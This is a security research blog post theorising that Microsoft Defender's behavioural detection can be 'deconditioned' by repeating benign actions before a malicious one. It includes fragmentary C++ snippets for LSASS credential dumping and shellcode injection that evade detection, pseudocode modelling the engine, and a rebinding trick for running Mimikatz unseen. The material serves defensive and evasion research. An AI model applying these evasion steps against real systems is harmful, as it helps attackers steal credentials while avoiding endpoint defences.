# Decondition Everything
## Alternate Titles
* Cross-Process Deconditioning
* Reversing Defenders Behavioural Engine
* Bypass Every EDR if you find the correct Rule
* This is why your malware gets detected

## Acknowlegdements
The following theory and pseudo-code is based on my and [Dobins](https://blog.deeb.ch) experience and exchange on the matter.

## TL;DR
### LSASS Dumping
```cpp
// usual dumping
MiniDumpWriteDump(lsassHandle, lsassPID, outHandle, MiniDumpWithFullMemory, NULL, NULL, NULL); // blocked 

// deconditioning
for (int i = 0; i < 20; i++) {
    MiniDumpWriteDump(explorerHandle, explorerPID, outHandle, MiniDumpWithFullMemory, NULL, NULL, NULL); // ok 
}
MiniDumpWriteDump(lsassHandle, lsassPID, outHandle, MiniDumpWithFullMemory, NULL, NULL, NULL); // ok --> profit
```

### Shellcode Injection
```cpp
// usual injection
LPVOID remAddr = VirtualAllocEx(hProc, nullptr, sizeof(shellcode), ...);
WriteProcessMemory(hProc, remAddr, &shellcode, ...);
CreateRemoteThread(hProc, nullptr, 0, remAddr, ...); // EDR likely scans memory, detects the malicious shellcode

// deconditioning (SirAllocALot)
for (int i = 0; i < 1000; i++) {
    VirtualAllocEx(); WriteProcessMemory(beningShellcode); CreateRemoteThread();
}
LPVOID remAddr = VirtualAllocEx(hProc, nullptr, sizeof(shellcode), ...);
WriteProcessMemory(hProc, remAddr, &shellcode, ...);
CreateRemoteThread(hProc, nullptr, 0, remAddr, ...); // no more scans
```

## Related Work
If you don't know what a behavioural engine or behavioural tracking is, have a look at [Detection Engines](/post/2025-12-04-defender-detection-engines) first.<br>
If you do not believe the results, see [Temporal Detections](/post/2025-12-02-defender-temporal-detections) where the observations stem from.<br>

## My Work
### Remarks
1. A.exe and A'.exe are lsass dumpers.
2. A.exe and A'.exe are compiled at the same time, same machine, same import function, and share most of their code.
3. EDRs have some "process identification" mechanism. This might be `hash(code_section)`, `imphash(x.exe)` or `metadata(x.exe)`. This allows to store only the identifier for lookups.

### Definitions
1. Process identification is defined as `PI(x.exe)`, for now it does not matter how it works exactly.
2. Deconditioning means "doing a similar, but non malicious action". In the context of lsass dumping this means dumping non-critical processes. In the context of running injected malicious shellcode this means running benign shellcode like `xor eax, eax; ret`.

### Observations regarding Decon and PI
1. A.exe is executed, it deconditions MDE (dump 20 other procs), then A.exe dumps lsass. -> <b>works</b> -> expected
2. A'.exe is executed, directly dumps lsass. -> <b>works</b> -> unexpected!
3. <i>Wait some time (~1h), or let A'.exe raise a non-behaviour alert (i.e. signature, memory, ..., does not matter how).</i>
4. A'.exe is executed again, directly dumps lsass. -> <b>blocked</b> -> expected
5. A.exe is executed again, deconditioning, then dumps lsass.exe -> <b>blocked</b> -> unexpected!

### Lemmas
1. From the remarks it follows that `A.exe != A'.exe`
2. But from observations it follows that `PI(A.exe) == PI(A'.exe)`

### Claims
1. Defender has a cutoff for tracking behaviours, like process dumping (else observation 1 would not dump lsass)
2. Defender uses a form of process identification (else observation 2 would not match result in observation 1, and 5 not 4)

## New Behavior Tracking Theory
This is pseudo-code and based only on the above.
```python
class Rule:
    name: str      # lsass-dump
    input: [event] # open_proc, open_file
    trigger: func  # proc == lsass

anti_lsass_dump = Rule("lsass-dump", [event.open_proc, event.open_file], event.target_proc == lsass)
...

rules = [anti_lass_dump, ...]
cache = {} # caching of all processed events (detection results) for performance increase

def get_rules_based_on_event(event):
    return filter(rules: if r.input == event.type)

def PI(process):
    return imphash(process.code) # or metadata(process.file) or hash(process.code)

def behaviour_handler(event):
    process_identity = PI(event.process)

    # which behaviour rules are subscribed to this event, e.g. event open process -> lsass-dump
    rules = get_rules_based_on_event(event)
    for r in rules:
        if cache[r.name][process_identity] == -1: # previously detected
            return true # ALERT!

        elif cache[r.name][process_identity]++ < cutoff:
            if r.trigger(event):
                cache[r.name][process_identity] = -1 # store as known bad
                return true # ALERT!
            # else: rule checked but no suspicious action found, continue

# example, "A.exe" opens a proc, but non malicious
a_pi = PI("a.exe")
cache = {
    anti_lsass_dump: {
        a_pi: 1
    }
}
# repeat 10x
cache = {
    anti_lsass_dump: {
        a_pi: 10
    }
}
# now (speculated) cutoff is reached, anti_lsass_dump on a_pi will always return non malicious
```

## Conclusions
1. If your malware is detected when doing X, find the associated rule and decondition it
2. ??
3. ??
4. Profit

## Further Research
* Do the cache cutoffs depend on [rule] and [process_identity], or only on rule? It should depend on both, else A.exe can decondition the EDR, and EVERY proc on the system is now whitelisted for proc dumping.
* Can the exact PI function be found? Is it really imphash?
* Find more rules besides this `anti_lsass_dump` and [C2 Loaders (SirAllocALot)](https://github.com/dobin/SuperMega?tab=readme-ov-file#anti-emulation) 

### Decontitioner Project
* May get more insights with dedicated [Deconditioner Enumerator](https://github.com/cailllev/Deconditioner-Enumerator)
* see also the follow-up [blog post](/post/2025-12-06-decondition-enumerator)

## Ammendments
* The `PI(A.exe)` seems to be more complex. Further testing has revealed the following behaviour:
  * A.exe was behaviourally detected at some point, meaning as soon as A.exe had a process handle open to lsass, all further dumps were blocked (also non-lsass procs).
  * Only after changing an encrypted string (the outfile for the dump) <b>lsass could be dumped again</b>. Let's call this B.exe
    * From this follows: `PI(B.exe) != PI(A.exe)`, else B.exe would also be blocked just as A'.exe, because `PI(A.exe) == PI(A'.exe)`
  * But now all previous A.exe and A'.exe are <b>again able to dump lsass</b>.
    * And from this follow: `PI(B.exe) == PI(A.exe)`, contradicting the earlier statement.
  * This could mean there are different process identifier functions, or layers to it.
    * Maybe the cutoffs are only per rule, and not per rule+PI. This could clear all known-bad PIs per rule, while still blocking similar exes as long as the cache was not cleared.
```python
    for r in rules:
        if cache[r.name][process_identity] == -1: # previously detected
            return true # ALERT!

        elif cache[r.name]++ < cutoff: # instead of cache[r.name][process_identity]
            if r.trigger(event):
                cache[r.name][process_identity] = -1 # store as known bad
                return true # ALERT!
            # else: rule checked but no suspicious action found, continue
```
* Bitdefender's talk at Insomni'hack 2026 revealed that `Invoke-Mimikatz` does **not trigger** an alert, when `C:\path\to\powershell.exe` is overwritten with a bind link to `C:\path\to\TiWorker.exe`, see [Talk Overview](https://insomnihack.ch/talks/silo-binding-uncovering-the-ghost-in-the-silo/) and [Video not yet released]()
  * This is yet another indication of behaviour bypass, it should additionally be verified with:
    * LsassDump.exe with no rebinding (no deconditioning) -> expect block
    * LsassDump.exe with rebinding to edge.exe -> may be blocked, edge.exe not fully trusted
    * LsassDump.exe with rebinding to TiWorker.exe -> expect bypass, TiWorker.exe trusted
